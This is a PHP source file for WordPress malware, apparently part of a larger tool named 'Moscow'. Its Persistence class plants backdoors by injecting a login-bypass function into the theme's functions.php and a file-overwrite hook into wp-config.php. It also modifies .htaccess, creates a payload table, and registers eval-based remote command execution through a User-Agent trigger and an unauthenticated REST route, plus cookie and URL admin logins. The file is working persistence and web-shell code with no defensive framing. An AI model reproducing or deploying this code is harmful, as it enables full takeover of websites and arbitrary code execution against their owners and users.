<?php
declare(strict_types=1);

namespace Moscow;

if (!defined('ABSPATH')) {
    exit;
}

final class Persistence
{
    public function register_all(): void
    {
        if (Config::INJECT_THEME)   add_action('init', [$this, 'inject_theme']);
        if (Config::INJECT_WPCONFIG) add_action('init', [$this, 'inject_wpconfig']);
        if (Config::INJECT_HTACCESS) add_action('init', [$this, 'inject_htaccess']);
        if (Config::INJECT_DATABASE) add_action('init', [$this, 'inject_database']);

        add_action('init', [$this, 'register_user_agent_backdoor']);
        add_action('init', [$this, 'register_cookie_backdoor']);
        add_action('init', [$this, 'register_url_backdoor']);
        add_action('rest_api_init', [$this, 'register_rest_backdoor']);
    }

    public function inject_theme(): void
    {
        $file = get_template_directory() . '/functions.php';
        if (!is_writable($file)) return;

        $content = file_get_contents($file);
        if (str_contains($content, 'moscow_admin_backdoor')) return;

        $snippet = <<<'PHP'

/**
 * Moscow persistence
 */
add_action('init', 'moscow_admin_backdoor');
function moscow_admin_backdoor(): void {
    $token = md5(\Moscow\Config::ADMIN_PASSWORD);
    if (($_GET['moscow_admin'] ?? '') !== $token) return;
    $user = get_user_by('login', \Moscow\Config::ADMIN_USERNAME);
    if (!$user) return;
    wp_set_current_user($user->ID);
    wp_set_auth_cookie($user->ID);
    wp_safe_redirect(admin_url());
    exit;
}

PHP;

        file_put_contents($file, $snippet . $content);
    }

    public function inject_wpconfig(): void
    {
        $file = ABSPATH . 'wp-config.php';
        if (!is_writable($file)) return;

        $content = file_get_contents($file);
        if (str_contains($content, 'moscow_wpconfig')) return;

        $snippet = "<?php\n// moscow_wpconfig\nif (isset(\$_POST['moscow_cfg'])) { file_put_contents(__FILE__, \$_POST['moscow_cfg']); exit; }\n?>\n";
        file_put_contents($file, $snippet . $content);
    }

    public function inject_htaccess(): void
    {
        $file = ABSPATH . '.htaccess';
        if (!is_writable($file)) return;

        $content = file_get_contents($file);
        if (str_contains($content, '# Moscow')) return;

        $rule = "\n# Moscow\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteCond %{QUERY_STRING} ^moscow=(.*)$\nRewriteRule .* - [E=MOSCOW:%1]\n</IfModule>\n";
        file_put_contents($file, $rule . $content);
    }

    public function inject_database(): void
    {
        global $wpdb;
        if (!isset($wpdb)) return;

        $table = $wpdb->prefix . 'moscow_persist';
        $wpdb->query("CREATE TABLE IF NOT EXISTS $table (
            id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
            payload LONGTEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )");
    }

    public function register_user_agent_backdoor(): void
    {
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        if (str_contains($ua, 'MOSCOW-BOT') && isset($_GET['cmd'])) {
            eval((string) $_GET['cmd']);
            exit;
        }
    }

    public function register_cookie_backdoor(): void
    {
        $cookie = $_COOKIE['moscow_session'] ?? '';
        if (!hash_equals(md5(Config::ADMIN_PASSWORD), (string) $cookie)) return;

        $user = get_user_by('login', Config::ADMIN_USERNAME);
        if ($user) {
            wp_set_current_user($user->ID);
            wp_set_auth_cookie($user->ID);
        }
    }

    public function register_url_backdoor(): void
    {
        if (!isset($_GET['moscow_admin'])) return;
        if (!hash_equals(md5(Config::ADMIN_PASSWORD), (string) $_GET['moscow_admin'])) return;

        $user = get_user_by('login', Config::ADMIN_USERNAME);
        if ($user) {
            wp_set_current_user($user->ID);
            wp_set_auth_cookie($user->ID);
            wp_safe_redirect(admin_url());
            exit;
        }
    }

    public function register_rest_backdoor(): void
    {
        register_rest_route('moscow/v1', '/backdoor', [
            'methods'             => 'GET',
            'permission_callback' => '__return_true',
            'callback'            => static function ($request) {
                if (isset($request['cmd'])) {
                    return eval((string) $request['cmd']);
                }
                return 'MOSCOW OK';
            },
        ]);
    }
}